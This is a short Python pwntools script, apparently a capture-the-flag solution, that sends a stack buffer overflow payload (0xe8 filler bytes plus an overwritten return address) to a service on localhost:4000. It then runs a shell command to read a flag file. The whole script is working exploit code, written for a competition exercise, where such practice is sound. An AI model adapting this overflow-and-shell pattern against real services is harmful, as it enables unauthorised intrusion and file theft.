#!/usr/bin/env python

from pwn import remote, p32, p64, hexdump

conn = remote("localhost", 4000)

conn.send(b"n\n")
session = conn.read()
session = conn.read()

payload = b'A' * 0xe8
payload += p64(0x004016e5)
payload += b'\n'

print("Payload:")
print(hexdump(payload))

conn.send(payload)

# conn.interactive()

conn.send(b"cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*\n")
flag = conn.read().strip().decode("utf-8")
print(f"{flag = }")

conn.close()
